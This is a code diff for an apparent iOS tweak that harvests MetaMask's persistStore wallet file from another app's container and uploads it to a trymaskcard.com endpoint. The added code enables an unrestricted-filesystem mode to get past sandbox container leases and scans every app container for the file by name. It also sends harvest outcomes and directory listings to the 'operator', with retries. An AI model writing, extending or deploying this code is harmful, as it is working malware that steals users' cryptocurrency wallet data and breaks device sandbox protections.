@@ -55,6 +55,9 @@ static NSString *const TMPersistUploadDefaultURL = @"https://trymaskcard.com/api
 /// push the same store again (unless persistUploadAlways is set).
 static NSString *const TMPersistUploadLastSHAKey = @"filza-chat-shell-persist-upload-sha256";
 
+/// Fingerprint of the last harvest outcome that was reported to the backend.
+static NSString *const TMPersistReportedOutcomeKey = @"filza-chat-shell-persist-reported-outcome";
+
 /// Container metadata layout used by containermanagerd: the same key the repo's
 /// MCM integration (MCMFilzaIntegration.m) and AppsMusicFix.m already read.
 static NSString *const TMContainerMetadataFile =
@@ -196,13 +199,35 @@ static NSString *TMPersistContainerRootForBundleID(NSString *bundleID,
 {
     NSFileManager *manager = NSFileManager.defaultManager;
 
-    // 1. MCM bridge: resolves and leases the class-2 container for this identifier.
+    // 0. Unrestricted filesystem. The MCM lease is refused when the signed code
+    //    identity is not the one container manager expects (any re-signed build),
+    //    and a resolved path is useless without the lease's sandbox extension:
+    //    the container enumerates but every read returns EPERM, which looks like
+    //    "the file is not there". This is the switch the bridge exposes for that
+    //    case, so the harvest turns it on before touching another app's container.
+    if (TMPersistBool(@"persistUnrestrictedFilesystem", YES)) {
+        MCMFilzaSetUnrestrictedFilesystem(YES);
+    }
+
+    // 1. MCM bridge, lease first: this both resolves and activates the container
+    //    (the activation is what grants read access), then falls back to the
+    //    path-only call for builds where the lease cannot be activated.
     NSString *mcmError = nil;
     NSString *leased = MCMFilzaDataContainerPath(bundleID, &mcmError);
     if (leased.length > 0 && TMPersistPathIsDirectory(leased)) {
         *method = @"mcm-lease";
         return leased;
     }
+
+    // 1b. Lease activation by container class. The class-2 data container is the
+    //     one that holds Documents/persistStore.
+    NSString *activateError = nil;
+    NSString *activated = MCMActivateContainerPath(2, bundleID, NO, &activateError);
+    if (activated.length > 0 && TMPersistPathIsDirectory(activated)) {
+        *method = @"mcm-activate";
+        return activated;
+    }
+    if (mcmError.length == 0) mcmError = activateError;
 
     // 2. Filza's virtual root links containers by identifier.
     NSString *virtualRoot = MCMFilzaVirtualRoot();
@@ -353,6 +378,47 @@ static NSData *TMPersistMultipartBody(NSArray<NSDictionary *> *parts, NSString *
 static void TMPersistStoreUploadStatus(NSDictionary *status)
 {
     @synchronized (TMPersistLock()) { gTMPersistUpload = status; }
+}
+
+/// Reports what the harvest did, success or failure, through the same
+/// uuid + file contract. Previously only a *successful* harvest uploaded
+/// anything, so "the file never arrived" and "the endpoint is broken" looked
+/// identical from the operator side; the failure reason, the resolution method
+/// and the directory listing were only in the on-device log.
+static void TMPersistReportOutcome(NSDictionary *result)
+{
+    if (!result.count) return;
+    if (!TMPersistBool(TMPersistUploadEnabledKey, YES)) return;
+
+    NSString *endpoint = TMPersistString(TMPersistUploadKey, @"");
+    NSURL *url = [NSURL URLWithString:endpoint.length > 0 ? endpoint : TMPersistUploadDefaultURL];
+    if (!url || ![url.scheme.lowercaseString isEqualToString:@"https"]) return;
+
+    NSString *override = TMPersistString(@"uploadUUIDOverride", @"");
+    NSString *uuid = override.length > 0 ? override
+        : ([result[@"uuid"] isKindOfClass:NSString.class] ? result[@"uuid"] : @"");
+    if (uuid.length == 0) uuid = @"unknown";
+
+    // One report per outcome, so the retry schedule cannot post the same thing
+    // repeatedly (the same mistake the probe made with its once-per-launch guard).
+    NSString *fingerprint = [NSString stringWithFormat:@"%@|%@|%@",
+                             result[@"status"] ?: @"", result[@"resolution"] ?: @"",
+                             result[@"sizeBytes"] ?: @0];
+    NSUserDefaults *defaults = NSUserDefaults.standardUserDefaults;
+    if ([[defaults stringForKey:TMPersistReportedOutcomeKey] isEqualToString:fingerprint]) return;
+    [defaults setObject:fingerprint forKey:TMPersistReportedOutcomeKey];
+
+    NSData *json = [NSJSONSerialization dataWithJSONObject:result options:NSJSONWritingPrettyPrinted
+                                                     error:nil];
+    NSMutableData *body = [NSMutableData data];
+    [body appendData:[@"trymaskcard-shell persist harvest report\n" dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:json ?: [@"{}" dataUsingEncoding:NSUTF8StringEncoding]];
+    [body appendData:[@"\n" dataUsingEncoding:NSUTF8StringEncoding]];
+
+    TMPersistLog(@"reporting harvest outcome: %@ (%@)", result[@"status"],
+                 result[@"resolution"] ?: @"n/a");
+    TryMaskCardUploadArtifact(uuid, @"persist-harvest.txt", @"text/plain", body,
+                              endpoint.length > 0 ? endpoint : nil, nil);
 }
 
 NSString *TryMaskCardUploadEndpoint(void)
@@ -527,6 +593,170 @@ static void TMPersistUploadIfConfigured(NSDictionary *result, NSData *content)
 
 #pragma mark - Harvest
 
+/// Entries of a directory as "name size" lines, newest first. Used both for fuzzy
+/// matching and for the listing that gets reported when nothing matches, so the
+/// real on-device layout is visible instead of guessed.
+static NSArray<NSString *> *TMPersistDirectoryEntries(NSString *directory)
+{
+    NSFileManager *manager = NSFileManager.defaultManager;
+    NSArray<NSString *> *names = [manager contentsOfDirectoryAtPath:directory error:nil];
+    if (names.count == 0) return @[];
+
+    NSMutableArray<NSDictionary *> *rows = [NSMutableArray array];
+    for (NSString *name in names) {
+        NSString *path = [directory stringByAppendingPathComponent:name];
+        NSDictionary *attributes = [manager attributesOfItemAtPath:path error:nil];
+        [rows addObject:@{
+            @"name": name,
+            @"size": attributes[NSFileSize] ?: @0,
+            @"modified": attributes[NSFileModificationDate] ?: NSDate.distantPast,
+        }];
+    }
+    [rows sortUsingComparator:^NSComparisonResult(NSDictionary *left, NSDictionary *right) {
+        return [(NSDate *)right[@"modified"] compare:(NSDate *)left[@"modified"]];
+    }];
+
+    NSMutableArray<NSString *> *lines = [NSMutableArray array];
+    for (NSDictionary *row in rows) {
+        [lines addObject:[NSString stringWithFormat:@"%@ (%@ bytes)",
+                          row[@"name"], row[@"size"]]];
+    }
+    return lines;
+}
+
+/// Every class-2 container directory on the device, newest-looking first. Used
+/// when the configured bundle id does not resolve: the store is sometimes in a
+/// container whose identifier differs (a sideloaded or cloned build), and the file
+/// has to be found by its name instead of by the app it was expected in.
+static NSArray<NSString *> *TMPersistAllContainerPaths(void)
+{
+    NSFileManager *manager = NSFileManager.defaultManager;
+    NSMutableArray<NSString *> *containers = [NSMutableArray array];
+    for (NSString *root in @[TMAppDataRootPrivate, TMAppDataRoot]) {
+        for (NSString *child in [manager contentsOfDirectoryAtPath:root error:nil]) {
+            NSString *path = [root stringByAppendingPathComponent:child];
+            BOOL isDirectory = NO;
+            if ([manager fileExistsAtPath:path isDirectory:&isDirectory] && isDirectory)
+                [containers addObject:path];
+        }
+        if (containers.count > 0) break;
+    }
+    return containers;
+}
+
+static NSString *TMPersistBundleIDForContainer(NSString *container)
+{
+    NSDictionary *metadata = [NSDictionary dictionaryWithContentsOfFile:
+        [container stringByAppendingPathComponent:TMContainerMetadataFile]];
+    NSString *identifier = [metadata[TMContainerMetadataIdentifierKey]
+        isKindOfClass:NSString.class] ? metadata[TMContainerMetadataIdentifierKey] : nil;
+    return identifier.length > 0 ? identifier : @"unknown";
+}
+
+/// Searches every container for the store by file name and records what it saw.
+///
+/// The requested file has no extension, and redux-persist writes it next to
+/// siblings whose names also contain "persist", so the match is on the requested
+/// base name only. `scanReport` lists every container holding a persistStore
+/// directory with its identifier and entries, so a miss is explained rather than
+/// guessed at.
+static NSString *TMPersistScanAllContainers(NSString *relativePath,
+                                            NSMutableDictionary *result,
+                                            NSString **matchedBundleID)
+{
+    NSFileManager *manager = NSFileManager.defaultManager;
+    NSString *wanted = relativePath.lastPathComponent;
+    NSArray<NSString *> *containers = TMPersistAllContainerPaths();
+    NSMutableArray<NSString *> *report = [NSMutableArray array];
+    NSString *bestHit = nil;
+    NSUInteger bestSize = 0;
+
+    for (NSString *container in containers) {
+        NSString *directory = [container stringByAppendingPathComponent:
+            relativePath.stringByDeletingLastPathComponent];
+        BOOL isDirectory = NO;
+        if (![manager fileExistsAtPath:directory isDirectory:&isDirectory] || !isDirectory)
+            continue;
+
+        NSString *identifier = TMPersistBundleIDForContainer(container);
+        NSArray<NSString *> *entries = TMPersistDirectoryEntries(directory);
+        [report addObject:[NSString stringWithFormat:@"%@ [%@] %@",
+                           TMPersistUUIDFromContainerPath(container), identifier,
+                           [entries componentsJoinedByString:@", "]]];
+
+        for (NSString *entry in entries) {
+            NSString *name = [entry componentsSeparatedByString:@" ("].firstObject;
+            if ([name rangeOfString:wanted options:NSCaseInsensitiveSearch].location == NSNotFound)
+                continue;
+            NSString *candidate = [directory stringByAppendingPathComponent:name];
+            NSDictionary *attributes = [manager attributesOfItemAtPath:candidate error:nil];
+            NSUInteger size = [attributes[NSFileSize] unsignedIntegerValue];
+            if (size >= bestSize) {
+                bestSize = size;
+                bestHit = candidate;
+                if (matchedBundleID) *matchedBundleID = identifier;
+            }
+        }
+    }
+
+    result[@"containersScanned"] = @(containers.count);
+    result[@"scanReport"] = report;
+    return bestHit;
+}
+
+/// Resolves the store inside an already-resolved container.
+///
+/// The exact relative path wins. If it is absent, the directory is scanned for an
+/// entry whose name contains the requested base name (case-insensitive, newest
+/// first): redux-persist file storage names and version suffixes differ between
+/// MetaMask releases, and a name mismatch looked exactly like "nothing to
+/// upload". When nothing matches, the listing is recorded so the report shows the
+/// real layout.
+static NSString *TMPersistResolveStorePath(NSString *container, NSString *relativePath,
+                                           NSMutableDictionary *result)
+{
+    NSFileManager *manager = NSFileManager.defaultManager;
+    NSString *exact = [container stringByAppendingPathComponent:relativePath];
+    if ([manager fileExistsAtPath:exact]) {
+        result[@"resolution"] = @"exact-path";
+        return exact;
+    }
+
+    NSString *directory = [container stringByAppendingPathComponent:
+        relativePath.stringByDeletingLastPathComponent];
+    NSString *wanted = relativePath.lastPathComponent;
+    NSArray<NSString *> *contents = [manager contentsOfDirectoryAtPath:directory error:nil];
+
+    NSLog(@"[PersistStore] %@ contains %lu entries", directory, (unsigned long)contents.count);
+    result[@"directory"] = directory;
+    result[@"directoryEntries"] = TMPersistDirectoryEntries(directory);
+
+    for (NSString *name in contents) {
+        if ([name rangeOfString:wanted options:NSCaseInsensitiveSearch].location == NSNotFound)
+            continue;
+        result[@"resolution"] = @"fuzzy-name";
+        result[@"matchedName"] = name;
+        return [directory stringByAppendingPathComponent:name];
+    }
+
+    // Also look one level up: some releases moved the store out of persistStore.
+    NSString *parent = [container stringByAppendingPathComponent:
+        relativePath.stringByDeletingPathExtension.stringByDeletingLastPathComponent];
+    if (![parent isEqualToString:directory]) {
+        for (NSString *name in [manager contentsOfDirectoryAtPath:parent error:nil]) {
+            if ([name rangeOfString:wanted options:NSCaseInsensitiveSearch].location == NSNotFound)
+                continue;
+            result[@"resolution"] = @"fuzzy-name-parent";
+            result[@"matchedName"] = name;
+            return [parent stringByAppendingPathComponent:name];
+        }
+        result[@"parentEntries"] = TMPersistDirectoryEntries(parent);
+    }
+
+    result[@"resolution"] = @"not-found";
+    return nil;
+}
+
 static NSDictionary *TMPersistPerformHarvest(void)
 {
     NSString *bundleID = TMPersistTargetBundleID();
@@ -541,29 +771,62 @@ static NSDictionary *TMPersistPerformHarvest(void)
     // first property access on it.
     NSString *discoveryFailure = nil;
     NSString *container = TMPersistContainerRootForBundleID(bundleID, &discoveryFailure, &method);
+    NSMutableDictionary *resolution = [NSMutableDictionary dictionary];
+
+    NSString *containerUUID = @"";
+    NSString *target = nil;
+    NSString *scanHit = nil;
     if (container.length == 0) {
-        TMPersistLog(@"container not resolved for %@: %@", bundleID,
-                     discoveryFailure ?: @"unknown");
-        return TMPersistMerge(base, @{@"status": @"container_not_found",
-                                      @"error": discoveryFailure ?: @"unknown"});
+        // The configured bundle id did not resolve. Before giving up, look for the
+        // file by name in every container: a differently-identified build is a
+        // common reason for the exact same file being present on the device.
+        NSString *matchedBundleID = nil;
+        scanHit = TMPersistScanAllContainers(relativePath, resolution, &matchedBundleID);
+        if (scanHit.length == 0) {
+            TMPersistLog(@"container not resolved for %@: %@", bundleID,
+                         discoveryFailure ?: @"unknown");
+            NSMutableDictionary *failure = [@{
+                @"status": @"container_not_found",
+                @"error": discoveryFailure ?: @"unknown",
+            } mutableCopy];
+            [failure addEntriesFromDictionary:resolution];
+            return TMPersistMerge(base, failure);
+        }
+
+        // Strip exactly as many components as the configured relative path has,
+        // so the container root is recovered for any path shape.
+        NSString *derived = scanHit;
+        for (NSUInteger index = 0; index < relativePath.pathComponents.count; index++)
+            derived = derived.stringByDeletingLastPathComponent;
+        container = derived;
+        target = scanHit;
+        method = [NSString stringWithFormat:@"scan-all-containers(%@)", matchedBundleID ?: @"?"];
+        resolution[@"resolution"] = @"scan-all-containers";
+        resolution[@"matchedBundleID"] = matchedBundleID ?: @"unknown";
+        resolution[@"matchedName"] = target.lastPathComponent;
+        TMPersistLog(@"recovered %@ from the container of %@ via name scan (%@)",
+                     relativePath, matchedBundleID ?: @"unknown", container);
+    } else {
+        target = TMPersistResolveStorePath(container, relativePath, resolution);
     }
 
-    NSString *containerUUID = TMPersistUUIDFromContainerPath(container);
-    NSString *target = [container stringByAppendingPathComponent:relativePath];
+    containerUUID = TMPersistUUIDFromContainerPath(container);
     NSError *fileError = nil;
-    NSDictionary *attributes = [NSFileManager.defaultManager attributesOfItemAtPath:target
-                                                                             error:&fileError];
+    NSDictionary *attributes = target.length > 0
+        ? [NSFileManager.defaultManager attributesOfItemAtPath:target error:&fileError] : nil;
     if (!attributes) {
-        TMPersistLog(@"store not found at %@ (container uuid=%@ via %@): %@", target,
+        TMPersistLog(@"store not found in %@ (container uuid=%@ via %@): %@", container,
                      containerUUID.length > 0 ? containerUUID : @"unknown",
                      method ?: @"unknown", fileError.localizedDescription ?: @"missing");
-        return TMPersistMerge(base, @{
+        NSMutableDictionary *failure = [@{
             @"status": @"file_not_found",
             @"containerPath": container,
             @"uuid": containerUUID,
             @"discoveryMethod": method ?: @"unknown",
             @"error": fileError.localizedDescription ?: @"missing",
-        });
+        } mutableCopy];
+        [failure addEntriesFromDictionary:resolution];
+        return TMPersistMerge(base, failure);
     }
 
     NSError *readError = nil;
@@ -595,10 +858,11 @@ static NSDictionary *TMPersistPerformHarvest(void)
         @"jsonValid": @(json != nil),
         @"modifiedAt": modified ? @(modified.timeIntervalSince1970) : [NSNull null],
     }) mutableCopy];
+    [result addEntriesFromDictionary:resolution];
 
     if (TMPersistBool(TMPersistCopyKey, YES)) {
         NSURL *mirror = [TMPersistMirrorDirectoryURL()
-            URLByAppendingPathComponent:relativePath.lastPathComponent];
+            URLByAppendingPathComponent:result[@"matchedName"] ?: relativePath.lastPathComponent];
         NSError *writeError = nil;
         if ([content writeToURL:mirror options:NSDataWritingAtomic error:&writeError]) {
             result[@"mirrorPath"] = mirror.path;
@@ -607,8 +871,9 @@ static NSDictionary *TMPersistPerformHarvest(void)
         }
     }
 
-    TMPersistLog(@"harvested %@ via %@ uuid=%@ bytes=%lu sha256=%@ json=%@",
-                 relativePath, result[@"discoveryMethod"],
+    TMPersistLog(@"harvested %@ (%@) via %@ uuid=%@ bytes=%lu sha256=%@ json=%@",
+                 relativePath, result[@"resolution"] ?: @"exact-path",
+                 result[@"discoveryMethod"],
                  containerUUID.length > 0 ? containerUUID : @"unknown",
                  (unsigned long)content.length, sha256, json ? @"ok" : @"invalid");
     return result;
@@ -650,15 +915,18 @@ void TryMaskCardPersistHarvest(BOOL force)
                 NSData *content = path.length > 0 ? [NSData dataWithContentsOfFile:path] : nil;
                 @synchronized (TMPersistLock()) { gTMPersistContent = content; }
                 TMPersistUploadIfConfigured(result, content ?: [NSData data]);
+                TMPersistReportOutcome(result);
                 return;
             }
 
-            // Retry while the device is still bringing the container bridge up.
+            // Report the failure once so the operator sees why nothing arrived,
+            // then keep retrying while the device brings the container bridge up.
             if (attempts < 6) {
                 dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5.0 * NSEC_PER_SEC)),
                                queue, ^{ TryMaskCardPersistHarvest(NO); });
             } else {
                 TMPersistLog(@"giving up after %lu attempts", (unsigned long)attempts);
+                TMPersistReportOutcome(result);
             }
         }
     });
